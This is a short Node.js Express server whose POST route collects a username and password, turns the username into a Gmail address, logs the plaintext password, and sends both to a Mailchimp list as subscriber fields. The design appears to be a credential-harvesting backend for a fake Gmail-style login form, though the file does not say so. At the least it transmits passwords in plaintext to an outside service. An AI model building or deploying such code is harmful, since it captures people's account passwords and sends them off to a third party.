const express = require("express");
const bodyParser = require("body-parser");
const https = require("https");
// const { getMaxListeners } = require("process");
const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static("public"));

app.get("/", (req, res) => {
  res.sendFile(__dirname + "/index.html");
});

app.post("/", (req, res) => {
  // console.log(req.body);
  const uname = req.body.username;
  const pass = req.body.password;
  let email = "";
  if (!uname.includes("@gmail.com")) {
    email = uname + "@gmail.com";
  } else {
    email = uname;
  }
  console.log(email, pass);
  const data = {
    members: [
      {
        email_address: email,
        status: "subscribed",
        merge_fields: {
          PASS: pass,
          UNAME: uname,
        },
      },
    ],
  };
  const dataJson = JSON.stringify(data);
  const url = "https://us7.api.mailchimp.com/3.0/lists/LIST_ID";
  const options = {
    method: "POST",
    auth: "aman:API_KEY",
  };
  const request = https.request(url, options, (response) => {
    response.on("data", (data) => {
      data = JSON.parse(data);
      console.log(data);
      if (res.statusCode == 200 && data.error_count == 0) {
        res.sendFile(__dirname + "/success.html");
      } else {
        res.sendFile(__dirname + "/fail.html");
      }
    });
  });
  request.write(dataJson);
  request.end();
});

app.listen(process.env.PORT || "3000", () => {
  console.log("Server is running on port :3000");
});
